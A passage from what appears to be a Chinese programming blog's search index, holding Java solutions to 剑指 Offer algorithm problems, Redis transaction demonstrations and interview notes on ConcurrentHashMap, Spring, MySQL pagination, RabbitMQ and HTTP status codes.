ArrayList\u0026lt;Integer\u0026gt;(); if (matrix == null || matrix.length == 0) { return new int[0]; } int rowStart = 0, rowEnd = matrix.length - 1; int columnStart = 0, columnEnd = matrix[0].length - 1; while (true) { //从左到右  for (int i = columnStart; i \u0026lt;= columnEnd; i++) { list.add(matrix[rowStart][i]); } if (++rowStart \u0026gt; rowEnd) { break; } //从上到下  for (int i = rowStart; i \u0026lt;= rowEnd; i++) { list.add(matrix[i][columnEnd]); } if (--columnEnd \u0026lt; columnStart) { break; } //从右到左  for (int i = columnEnd; i \u0026gt;= columnStart; i--) { list.add(matrix[rowEnd][i]); } if (--rowEnd \u0026lt; rowStart) { break; } //从下到上  for (int i = rowEnd; i \u0026gt;= rowStart; i--) { list.add(matrix[i][columnStart]); } if (++columnStart \u0026gt; columnEnd) { break; } } return list.stream().mapToInt(Integer::intValue).toArray(); } } 剑指 Offer 29. 顺时针打印矩阵 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-29.-%E9%A1%BA%E6%97%B6%E9%92%88%E6%89%93%E5%8D%B0%E7%9F%A9%E9%98%B5-/","series":[],"tags":[""],"title":"剑指 Offer 29. 顺时针打印矩阵"},{"categories":[""],"content":" 哈希表统计法： 遍历数组 nums ，用 HashMap 统计各数字的数量，即可找出 众数 。此方法时间和空间复杂度均为 O(N) 。 数组排序法： 将数组 nums 排序，数组中点的元素 一定为众数。 摩尔投票法： 核心理念为 票数正负抵消 。此方法时间和空间复杂度分别为 O(N) 和 O(1) ，为本题的最佳解法。  public static int majorityElement(int[] nums) { HashMap\u0026lt;Integer, Integer\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; nums.length; i++) { if (map.containsKey(nums[i])) { map.put(nums[i], map.get(nums[i]) + 1); } else { map.put(nums[i], 1); } } int max = 0; Integer res = null; for (Map.Entry entry : map.entrySet()) { if ((Integer)entry.getValue() \u0026gt; max){ max = (Integer)entry.getValue(); res = (Integer) entry.getKey(); } } return res; } class Solution { public static int majorityElement(int[] nums) { Arrays.sort(nums); return nums[nums.length / 2]; } } class Solution { public int majorityElement(int[] nums) { int first = nums[0]; int sum = 1; for (int i = 1; i \u0026lt; nums.length; i++) { if (sum == 0){ first = nums[i]; sum = 1; }else { sum = nums[i] == first ? sum + 1 : sum - 1; } } return first; } } 剑指 Offer 39. 数组中出现次数超过一半的数字 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-39.-%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97/","series":[],"tags":[""],"title":"剑指 Offer 39. 数组中出现次数超过一半的数字"},{"categories":[""],"content":"public static String minNumber(int[] nums) { //to IntStream  return Arrays.stream(nums) //to Stream\u0026lt;Integer\u0026gt;  .boxed() //Stream\u0026lt;String\u0026gt;  .map(String::valueOf) //排序  .sorted((o1, o2) -\u0026gt; (o1 + o2).compareTo(o2 + o1)) //to String  .collect(Collectors.joining(\u0026#34;\u0026#34;)); } 剑指 Offer 45. 把数组排成最小的数 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-45.-%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0/","series":[],"tags":[""],"title":"剑指 Offer 45. 把数组排成最小的数"},{"categories":[""],"content":"方法二：有序哈希表\n在哈希表的基础上，有序哈希表中的键值对是 按照插入顺序排序 的。基于此，可通过遍历有序哈希表，实现搜索首个 “数量为 1的字符”。\n哈希表是 去重 的，即哈希表中键值对数量 ≤ 字符串 s 的长度。因此，相比于方法一，方法二减少了第二轮遍历的循环次数。当字符串很长（重复字符很多）时，方法二则效率更高。\n复杂度分析：\n时间和空间复杂度均与 “方法一” 相同，而具体分析：方法一 需遍历 s 两轮；方法二 遍历 s 一轮，遍历dic一轮（dic 的长度不大于 26 ）。\nJava 使用 LinkedHashMap 实现有序哈希表。\npublic char firstUniqChar(String s) { LinkedHashMap\u0026lt;Character, Integer\u0026gt; map = new LinkedHashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; s.length(); i++) { if (map.containsKey(s.charAt(i))) { map.put(s.charAt(i), map.get(s.charAt(i)) + 1); } else { map.put(s.charAt(i), 1); } } for (Map.Entry\u0026lt;Character, Integer\u0026gt; entry : map.entrySet()) { if (entry.getValue() == 1) { return entry.getKey(); } } return \u0026#39; \u0026#39;; } 剑指 Offer 50. 第一个只出现一次的字符 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-50.-%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6/","series":[],"tags":[""],"title":"剑指 Offer 50. 第一个只出现一次的字符"},{"categories":[""],"content":"方法1\nclass Solution { Integer res, k; public int kthLargest(TreeNode root, int k) { this.k = k; dfs(root); return res; } private void dfs(TreeNode root) { if (root == null || k == 0) { return; } dfs(root.right); if (--k == 0) { res = root.val; return; } dfs(root.left); } } 方法2\npublic int kthLargest(TreeNode root, int k) { PriorityQueue\u0026lt;Integer\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(k); traverse(root, queue, k); return queue.peek(); } private void traverse(TreeNode root, PriorityQueue\u0026lt;Integer\u0026gt; queue, int k) { if (root == null) { return; } if (queue.size() \u0026lt; k) { queue.offer(root.val); } else if (queue.peek() \u0026lt; root.val) { queue.poll(); queue.offer(root.val); } traverse(root.left, queue, k); traverse(root.right, queue, k); } 剑指 Offer 54. 二叉搜索树的第k大节点 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-54.-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E7%AC%ACk%E5%A4%A7%E8%8A%82%E7%82%B9/","series":[],"tags":[""],"title":"剑指 Offer 54. 二叉搜索树的第k大节点"},{"categories":[""],"content":"class Solution { public int maxDepth(TreeNode root) { if(root == null){ return 0; } if (root.left == null \u0026amp;\u0026amp; root.right == null) { return 1; } int left = maxDepth(root.left); int right = maxDepth(root.right); return left \u0026gt; right ? left + 1 : right + 1; } } 剑指 Offer 55 - I. 二叉树的深度 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-55-i.-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6/","series":[],"tags":[""],"title":"剑指 Offer 55 - I. 二叉树的深度"},{"categories":[""],"content":"class Solution { public int[] singleNumbers(int[] nums) { if (nums == null) { return new int[0]; } Set\u0026lt;Integer\u0026gt; set = new HashSet\u0026lt;\u0026gt;(2); for (int i = 0; i \u0026lt; nums.length; i++) { if (set.contains(nums[i])) { set.remove(nums[i]); } else { set.add(nums[i]); } } return set.stream().mapToInt(i -\u0026gt; i).toArray(); } } 剑指 Offer 56 - I. 数组中数字出现的次数 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-56-i.-%E6%95%B0%E7%BB%84%E4%B8%AD%E6%95%B0%E5%AD%97%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0/","series":[],"tags":[""],"title":"剑指 Offer 56 - I. 数组中数字出现的次数"},{"categories":[""],"content":"class Solution { public int[] twoSum(int[] nums, int target) { int head = 0; int tail = nums.length - 1; while (head \u0026lt; tail) { if (nums[head] + nums[tail] == target) { return new int[]{nums[head], nums[tail]}; } if (nums[head] + nums[tail] \u0026gt; target) { tail--; continue; } if (nums[head] + nums[tail] \u0026lt; target) { head++; } } return new int[0]; } } 剑指 Offer 57. 和为s的两个数字 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-57.-%E5%92%8C%E4%B8%BAs%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97/","series":[],"tags":[""],"title":"剑指 Offer 57. 和为s的两个数字"},{"categories":[""],"content":"方法一：双指针\n算法解析：\n 倒序遍历字符串 s ，记录单词左右索引边界 i , j ； 每确定一个单词的边界，则将其添加至单词列表 res ； 最终，将单词列表拼接为字符串，并返回即可。  复杂度分析：\n 时间复杂度 O(N) ： 其中 N为字符串 s 的长度，线性遍历字符串。 空间复杂度 O(N)： 新建的 list(Python) 或 StringBuilder(Java) 中的字符串总长度 ≤N ，占用 O(N)大小的额外空间。  class Solution { public String reverseWords(String s) { if (s == null) { return null; } s = s.trim(); StringBuilder sb = new StringBuilder(); for (int pos1 = s.length() - 1, pos2 = s.length() - 1; pos1 \u0026gt;= 0; pos1--) { if (s.charAt(pos1) == \u0026#39; \u0026#39; || pos1 == 0) { if (pos1 != 0 \u0026amp;\u0026amp; s.charAt(pos1 + 1) == \u0026#39; \u0026#39;) { continue; } sb.append(s.substring(pos1, pos2 + 1).trim()).append(\u0026#34; \u0026#34;); pos2 = pos1; } } return sb.toString().trim(); } } 剑指 Offer 58 - I. 翻转单词顺序 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-58-i.-%E7%BF%BB%E8%BD%AC%E5%8D%95%E8%AF%8D%E9%A1%BA%E5%BA%8F/","series":[],"tags":[""],"title":"剑指 Offer 58 - I. 翻转单词顺序"},{"categories":[""],"content":"方法二：一次遍历 思路与算法\n在方法一中，我们对从根节点开始，通过遍历找出到达节点 pp 和 qq 的路径，一共需要两次遍历。我们也可以考虑将这两个节点放在一起遍历。\n整体的遍历过程与方法一中的类似：\n我们从根节点开始遍历；\n如果当前节点的值大于 pp 和 qq 的值，说明 pp 和 qq 应该在当前节点的左子树，因此将当前节点移动到它的左子节点；\n如果当前节点的值小于 pp 和 qq 的值，说明 pp 和 qq 应该在当前节点的右子树，因此将当前节点移动到它的右子节点；\n如果当前节点的值不满足上述两条要求，那么说明当前节点就是「分岔点」。此时，pp 和 qq 要么在当前节点的不同的子树中，要么其中一个就是当前节点。\n可以发现，如果我们将这两个节点放在一起遍历，我们就省去了存储路径需要的空间。\nclass Solution { public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null || p == null || q == null) { return null; } if (root.val \u0026gt; p.val \u0026amp;\u0026amp; root.val \u0026gt; q.val) { return lowestCommonAncestor(root.left, p, q); } if (root.val \u0026lt; p.val \u0026amp;\u0026amp; root.val \u0026lt; q.val) { return lowestCommonAncestor(root.right, p, q); } return root; } } 复杂度分析\n 时间复杂度：O(n)O(n)，其中 nn 是给定的二叉搜索树中的节点个数。分析思路与方法一相同。 空间复杂度：O(1)O(1)。  剑指 Offer 68 - I. 二叉搜索树的最近公共祖先 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-68-i.-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/","series":[],"tags":[""],"title":"剑指 Offer 68 - I. 二叉搜索树的最近公共祖先"},{"categories":[""],"content":"方法二：存储父节点\n思路\n我们可以用哈希表存储所有节点的父节点，然后我们就可以利用节点的父节点信息从 p 结点开始不断往上跳，并记录已经访问过的节点，再从 q 节点开始不断往上跳，如果碰到已经访问过的节点，那么这个节点就是我们要找的最近公共祖先。\n算法\n 从根节点开始遍历整棵二叉树，用哈希表记录每个节点的父节点指针。 从 p 节点开始不断往它的祖先移动，并用数据结构记录已经访问过的祖先节点。 同样，我们再从 q 节点开始不断往它的祖先移动，如果有祖先已经被访问过，即意味着这是 p 和 q 的深度最深的公共祖先，即 LCA 节点。  复杂度分析\n时间复杂度：O(N)，其中 NN 是二叉树的节点数。二叉树的所有节点有且只会被访问一次，从 p 和 q 节点往上跳经过的祖先节点个数不会超过 N，因此总的时间复杂度为 O(N)。\n空间复杂度：O(N)，其中 NN 是二叉树的节点数。递归调用的栈深度取决于二叉树的高度，二叉树最坏情况下为一条链，此时高度为 N，因此空间复杂度为 O(N)，哈希表存储每个节点的父节点也需要 O(N) 的空间复杂度，因此最后总的空间复杂度为 O(N)。\n/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { Map\u0026lt;Integer, TreeNode\u0026gt; parents = new HashMap\u0026lt;\u0026gt;(); Set\u0026lt;Integer\u0026gt; set = new HashSet\u0026lt;\u0026gt;(); public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null || p == null || q == null) { return null; } if (root == p || root == q) { return root; } dfs(root); TreeNode res = null; TreeNode pp = p; TreeNode qp = q; set.add(pp.val); while (parents.get(pp.val) != null) { set.add(parents.get(pp.val).val); pp = parents.get(pp.val); } while (qp != null) { if (!set.contains(qp.val)) { set.add(qp.val); qp = parents.get(qp.val); } else { res = qp; break; } } return res; } public void dfs(TreeNode root){ if (root == null){ return; } if (root.left != null){ parents.put(root.left.val, root); dfs(root.left); } if (root.right != null){ parents.put(root.right.val, root); dfs(root.right); } } } 剑指 Offer 68 - II. 二叉树的最近公共祖先 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-68-ii.-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/","series":[],"tags":[""],"title":"剑指 Offer 68 - II. 二叉树的最近公共祖先"},{"categories":[""],"content":"class Solution { public int fib(int n) { final int MOD = 1000000007; if (n == 0) { return 0; } if (n == 1) { return 1; } int first = 0, second = 1, res = 0; for (int i = 2; i \u0026lt;= n; i++) { res = (first + second) % MOD; first = second; second = res; } return res; } } 剑指 Offer 10- I. 斐波那契数列 ","date":"2021-10-11","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/leetcode/%E5%89%91%E6%8C%87-offer-10-i.-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97/","series":[],"tags":[""],"title":"斐波那契数列"},{"categories":["编程思想"],"content":"public static int topK(int[] arr, int k) { if (arr == null || k \u0026gt; arr.length || arr.length == 0 || k \u0026lt;= 0) { return -1; } PriorityQueue\u0026lt;Integer\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(k, Comparator.reverseOrder()); for (int i = 0; i \u0026lt; k; i++) { queue.add(arr[i]); } for (int i = k; i \u0026lt; arr.length; i++) { if (queue.peek() \u0026gt; arr[i]) { queue.poll(); queue.add(arr[i]); } } return queue.peek(); } ","date":"2021-10-09","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/topk/","series":["算法"],"tags":["算法"],"title":"TopK"},{"categories":["编程思想"],"content":"private TreeNode buildTree(Integer[] array, int index) { TreeNode treeNode; if (index \u0026lt; array.length) { Integer value = array[index]; if (value == null) { return null; } treeNode = new TreeNode(value); treeNode.left = buildTree(array, 2 * index + 1); treeNode.right = buildTree(array, 2 * index + 2); return treeNode; } return null; } ","date":"2021-10-09","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/%E6%95%B0%E7%BB%84%E8%BD%AC%E6%A0%91/","series":["算法"],"tags":["算法"],"title":"数组转树"},{"categories":["编程思想"],"content":"public class LRUCache\u0026lt;K,V\u0026gt;{ private final int cap; private final Map\u0026lt;K,V\u0026gt; map; private final LinkedList\u0026lt;K\u0026gt; list; public LRUCache(int cap) { this.cap = cap; map = new HashMap\u0026lt;\u0026gt;(cap); list = new LinkedList\u0026lt;\u0026gt;(); } public void put(K key, V value) { if (map.size() == cap){ K first = list.removeFirst(); map.remove(first); } list.addLast(key); map.put(key, value); } public V get(K key) { V value = map.get(key); if (value == null){ return null; }else { list.remove(key); list.addLast(key); return value; } } } ","date":"2021-10-09","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/algorithm/lrucache/","series":["算法"],"tags":["算法"],"title":"LRUCache"},{"categories":["编程思想"],"content":"redis它只是做到了：\n 它认为的原子性。（单个命令原子，多条命令不一定原子） 隔离性。（单线程执行，各事务串行执行，天然满足隔离） AOF/RDB保证了部分的持久性。（持久化的时候可能存在数据丢失） 它不存在ACID中的C的概念，因为它没有约束。  1. 命令使用错误 这种错误redis在执行前就能检查出来，因此整个事务都不执行。\n127.0.0.1:6379\u0026gt; get name \u0026#34;xumeili\u0026#34; 127.0.0.1:6379\u0026gt; get age \u0026#34;28\u0026#34; 127.0.0.1:6379\u0026gt; get sex \u0026#34;female\u0026#34; 127.0.0.1:6379\u0026gt; multi OK 127.0.0.1:6379\u0026gt; set name xuzhijun QUEUED 127.0.0.1:6379\u0026gt; set age (error) ERR wrong number of arguments for \u0026#39;set\u0026#39; command 127.0.0.1:6379\u0026gt; set sex male QUEUED 127.0.0.1:6379\u0026gt; exec (error) EXECABORT Transaction discarded because of previous errors. 127.0.0.1:6379\u0026gt; get name \u0026#34;xumeili\u0026#34; 127.0.0.1:6379\u0026gt; get age \u0026#34;28\u0026#34; 127.0.0.1:6379\u0026gt; get sex \u0026#34;female\u0026#34; 2. 命令执行错误 这种错误redis无法在执行前发现，因此不影响这种错误的前后命令被提交。\n127.0.0.1:6379\u0026gt; get name \u0026#34;xumeili\u0026#34; 127.0.0.1:6379\u0026gt; get age \u0026#34;28\u0026#34; 127.0.0.1:6379\u0026gt; get sex \u0026#34;female\u0026#34; 127.0.0.1:6379\u0026gt; multi OK 127.0.0.1:6379\u0026gt; set name tony QUEUED 127.0.0.1:6379\u0026gt; sadd age 100 QUEUED 127.0.0.1:6379\u0026gt; set sex male QUEUED 127.0.0.1:6379\u0026gt; exec 1) OK 2) (error) WRONGTYPE Operation against a key holding the wrong kind of value 3) OK 127.0.0.1:6379\u0026gt; get name \u0026#34;tony\u0026#34; 127.0.0.1:6379\u0026gt; get age \u0026#34;28\u0026#34; 127.0.0.1:6379\u0026gt; get sex \u0026#34;male\u0026#34; 3. 使用watch 事务内key值发生变化，整个事务不提交。\nsession1:\n127.0.0.1:6379\u0026gt; get name \u0026#34;xuzhijun\u0026#34; 127.0.0.1:6379\u0026gt; get age \u0026#34;300\u0026#34; 127.0.0.1:6379\u0026gt; get sex \u0026#34;female\u0026#34; 127.0.0.1:6379\u0026gt; watch age OK 127.0.0.1:6379\u0026gt; multi OK 127.0.0.1:6379\u0026gt; set name tony QUEUED 127.0.0.1:6379\u0026gt; set age 100 QUEUED 127.0.0.1:6379\u0026gt; set sex male QUEUED 127.0.0.1:6379\u0026gt; exec (nil) 127.0.0.1:6379\u0026gt; get name \u0026#34;xuzhijun\u0026#34; 127.0.0.1:6379\u0026gt; get age \u0026#34;28\u0026#34; 127.0.0.1:6379\u0026gt; get sex \u0026#34;female\u0026#34; session2:\n127.0.0.1:6379\u0026gt; set age 28 OK 127.0.0.1:6379\u0026gt; get age \u0026#34;28\u0026#34; 参考 Redis 设计与实现 redis事务一致性问题？？？ 如何理解数据库事务中的一致性的概念？ ","date":"2021-10-08","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/redis%E4%BA%8B%E5%8A%A1/","series":["Manual"],"tags":["Redis"],"title":"Redis事务"},{"categories":[""],"content":"网关性能指标 流量网关：高性能，与具体的业务耦合少，专注转发，不用引入业务逻辑，不用维护lua脚本，不要专门的lua团队\n业务网关：性能较高（没有指数级别的差距），与业务、技术栈相关，比如要通过Jar包和nacos、sential配合使用\nMock接口模拟20ms时延，报文大小约2K。\n4核8G\n   分类 产品 600并发 QPS 600并发 90% Latency(ms) 1000并发 QPS 1000并发 90% Latency(ms)     后端服务 直接访问后端服务 23540 32.19 27325 52.09   流量网关 kong v2.4.1 15662 50.87 17152 84.3   应用网关 fizz-gateway-community v2.0.0 12206 65.76 12766 100.34   应用网关 spring-cloud-gateway v2.2.9 11323 68.57 10472 127.59   应用网关 shenyu v2.3.0 9284 92.98 9939 148.61    hashmap扩容机制 当map中包含的Entry的数量大于等于threshold = loadFactor * capacity的时候，且新建的Entry刚好落在一个非空的桶上，此刻触发扩容机制，将其容量扩大为2倍。调用resize扩容。\nConcurrentHashMap JDK7\n数据结构：ReentrantLock + Segment + HashEntry\nmap一个Segment数组，Segment又是一个HashEntry数组，HashEntry有next指针，是一个链表结构\n元素查询：二次hash + 链表遍历，第一次Hash定位到Segment ，第二次Hash定位到元索所在的链表的头部\n锁：Segment继承了ReentrantLock，锁定操作的Segment，其他的Segment不受影响，并发度为Segment个数，可以通过构造函数指定，数组扩容不会影晌其他Segment\nJDK8\n数据结构：synchronized + CAS + Node + 红黑树\n 其实 Node 和 HashEntry 的内容一样\n 元素查询：一次hash + 遍历红黑树（元素个数小于8的时候还是链表）\n锁：锁链表的head节点，不影响其他元素的读写，锁粒度更细，效率更高，扩容时阻赛所有的读写操作、并发扩容\n下面简单介绍下主要的几个方法的一些区别：\n1. put() 方法 JDK1.7中的实现：\n 需要定位 2 次 （segments[i]，segment中的table[i]） 没获取到 segment锁的线程，没有权力进行put操作，不是像HashTable一样去挂起等待，而是会去做一下put操作前的准备：  table[i]的位置(你的值要put到哪个桶中) 通过首节点first遍历链表找有没有相同key 在进行1、2的期间还不断自旋获取锁，超过 64次 线程挂起！（单处理器自旋1次）    JDK1.8中的实现：\n 先根据 rehash值定位，拿到table[i]的 首节点first，然后：  如果为 null ，通过 CAS 的方式把 value put进去 如果 非null ，并且 first.hash == -1 ，说明其他线程在扩容，参与一起扩容 如果 非null ，并且 first.hash != -1 ，Synchronized锁住 first节点，判断是链表还是红黑树，遍历插入。    2. get() 方法 JDK1.7中的实现：\n 由于变量 value 是由 volatile 修饰的，java内存模型中的 happen before 规则保证了 对于 volatile 修饰的变量始终是 写操作 先于 读操作 的，并且还有 volatile 的 内存可见性 保证修改完的数据可以马上更新到主存中，所以能保证在并发情况下，读出来的数据是最新的数据。 如果get()到的是null值才去加锁。  JDK1.8中的实现：\n 和 JDK1.7类似  3. resize() 方法 JDK1.7中的实现：\n 跟HashMap的 resize() 没太大区别，都是在 put() 元素时去做的扩容，所以在1.7中的实现是获得了锁之后，在单线程中去做扩  new个2倍数组 遍历old数组节点搬去新数组    JDK1.8中的实现：\n jdk1.8的扩容支持并发迁移节点，从old数组的尾部开始，如果该桶被其他线程处理过了，就创建一个 ForwardingNode 放到该桶的首节点，hash值为-1，其他线程判断hash值为-1后就知道该桶被处理过了。  4. 计算size JDK1.7中的实现：\n 先采用不加锁的方式，计算两次，如果两次结果一样，说明是正确的，返回。 如果两次结果不一样，则把所有 segment 锁住，重新计算所有 segment的 Count 的和  JDK1.8中的实现：\n由于没有segment的概念，所以只需要用一个 baseCount 变量来记录ConcurrentHashMap 当前 节点的个数。\n 先尝试通过CAS 修改 baseCount 如果多线程竞争激烈，某些线程CAS失败，那就CAS尝试将 CELLSBUSY 置1，成功则可以把 baseCount变化的次数 暂存到一个数组 counterCells 里，后续数组 counterCells 的值会加到 baseCount 中。 如果 CELLSBUSY 置1失败又会反复进行CASbaseCount 和 CAScounterCells数组  印象深刻的经历 一次缓存优化经历\nRedis使用频率很高，流量高峰期千兆网卡跑满，导致数据读取非常慢。\n具体来说：假设应用接口的总访问次数是1000万，总缓存数据量大小50KB，一天要承受 500G 的数据流，平均每秒钟是 5.78M 的数据，高峰期按50倍估算，也就是说高峰期 Redis 服务每秒要传输超过 250 MB的数据，而千兆网卡的带宽只在120多MB。\n此时，立马能想到的解决办法是：1. 升级到万兆网卡。2. 使用redis cluster模式，并增加redis节点数量，将流量分摊多多台机器上\n但是，云服务器升级万兆网卡困难。增加节点使得成本攀升，并且此时数据量并不大，服务器负载并不高，仅仅是redis服务器数据吞吐量大。\n另辟蹊径：先访问本地内存，再访问redis，降低redis的访问频率（节点间数据同步的方案 —— Redis Pub/Sub , JGroups , MQ）。\n其他类似方案的缺陷：Ehcache集群模式 在应用节点之间传递完整缓存数据，这样岂不是会把应用服务器的带宽跑满？而，\nJ2Cache的问题：如果应用发生重启，本地缓存超时时间丢失。\n未来方向：封装成一个进程，服务器安装后，其他开发语言的应用可以通过客户端连接使用。\ngo channel https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-channel/ netty面试 spring单例vs多例 Spring Bean有五种作用域：\nsingleton , prototype, request , session , global session\n默认是单例，可以通过xml配置bean多例，更方便的是用@Scope(\u0026ldquo;prototype\u0026rdquo;)注解。\nController, Service, DAO默认都是单例的。\n单例是线程不安全的，所以不要在类中使用状态可变的成员变量。\n@Autowired 和 @Resourse区别 两者都可以写在字段和setter方法上\n@Autowired是Spring中定义注解，@Resourse是JRE定义的注解\n@Autowired默认按byType装配，需要按byName来装配，可以结合@Qualifier注解一起使用，@Resourse默认按byName装配，它有可以配置的属性 name和type\npublic class TestServiceImpl { @Autowired @Qualifier(\u0026#34;userDao\u0026#34;) private UserDao userDao; } tcp三握四分 + SpringMVC 打开网站看 Spring设计模式 适配器 + 工厂 + 代理 + 单例\nSpring启动流程 因为是基于 java-config 技术分析源码，所以这里的入口是 AnnotationConfigApplicationContext ，如果是使用 xml 分析，那么入口即为 ClassPathXmlApplicationContext ，它们俩的共同特征便是都继承了 AbstractApplicationContext 类，而大名鼎鼎的 refresh()便是在这个类中定义的。我们接着分析 AnnotationConfigApplicationContext 类，源码如下：\n// 初始化容器 public AnnotationConfigApplicationContext(Class\u0026lt;?\u0026gt;... annotatedClasses) { // 注册 Spring 内置后置处理器的 BeanDefinition 到容器  this(); // 注册配置类 BeanDefinition 到容器  register(annotatedClasses); // 加载或者刷新容器中的Bean  refresh(); } Spring的启动流程可以归纳为四个步骤：\n  创建Spring容器，如：new AnnotationConfigApplicationContext\n  初始化Spring容器\nspring容器的初始化时，通过this()调用了无参构造函数，主要做了以下三个事情：\n 实例化BeanFactory【DefaultListableBeanFactory】工厂，用于生成Bean对象 实例化BeanDefinitionReader注解配置读取器，用于对特定注解（如@Service、@Repository）的类进行读取转化成 BeanDefinition 对象，（BeanDefinition 是 Spring 中极其重要的一个概念，它存储了 bean 对象的所有特征信息，如是否单例，是否懒加载，factoryBeanName 等）➕ 注册内置的BeanPostProcessor的BeanDefinition到容器中 实例化ClassPathBeanDefinitionScanner路径扫描器，用于对指定的包目录进行扫描查找 bean 对象    将配置类的BeanDefinition注册到容器中\n  调用refresh()方法刷新容器\n  数据库深分页优化 成因：大量回表 👉🏿 大量随机IO\n 即使前10000个会扔掉，mysql也会通过二级索引上的主键id，去聚簇索引上查一遍数据，这可是10000次随机io，自然慢成哈士奇。 这里可能会提出疑问，为什么会有这种行为，这是mysql优化器的坑，至今也没解决。\n 子查询优化： 如下只有10次回表\nselect xxx,xxx from in (select id from table where second_index = xxx limit 10 offset 10000) **书签记录：**通过主键索引优化\nSELECT * FROM cps_user_order_detail d WHERE d.id \u0026gt; #{maxId} AND d.order_time\u0026gt;\u0026#39;2020-8-5 00:00:00\u0026#39; ORDER BY d.order_time desc LIMIT 6; id要是递增，不能跳页\nES + scroll + search_after\n滚动翻页\nRabbitMQ交换机类型 Exchange 的三种主要类型：Fanout、Direct 和 Topic\nFanout Exchange 会忽略 RoutingKey 的设置，直接将 Message 广播到所有绑定的 Queue 中，广播\nDirect Exchange 是 RabbitMQ 默认的 Exchange，对 RoutingKey 是精确匹配，单播\nTopic Exchange 支持对 RoutingKey 模糊匹配，多播\nJava通过Executors提供四种线程池 分别为：\n newCachedThreadPool创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可用线程，则新建线程。 newFixedThreadPool创建一个****定长线程池****，可控制线程最大并发数，超出的线程会在队列中等待。 ***newScheduledThreadPool*创建一个定长线程池，支持定时及周期性任务执行。 *newSingleThreadExecutor* 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。  常用Http状态码 301 Moved Permanently ：永久重定向（优先使用301）\n302 Found（临时重定向）\n401 Unauthorized\n403 Forbidden：资源不可用，防盗链\n429 Too Many Requests\n500 Internal Server Error\n502 Bad Gateway\n503 Service Unavailable\n504 Gateway Timeout\nRedis的Hashtable是如何扩容的 Redis渐进式rehash的好处在于它采取分而治之的方式，将rehash键值对所需的计算工作均摊到对字典的每个添加、删除、查找和更新操作上，从而避免了集中式rehash 而带来的庞大计算量。\nConcurrentHashMap多线程协同集中式扩容。在平均的情况下，是ConcurrentHashMap快。这也意味着，扩容时所需要花费的空间能够更快的进行释放。\n对比：\n 扩容所花费的时间对比：ConcurrentHashMap平均更快 读操作，两者的性能相差不多 写操作，Redis的字典返回更快些 删除操作，与写一样  怎么选择？\n 如果内存资源吃紧，希望能够进行快速的扩容方便释放扩容时需要的辅助空间，且那么选择后者。 如果对于写和删除操作要求迅速，那么可以选择前者。  Redis的Hashtable是如何扩容的 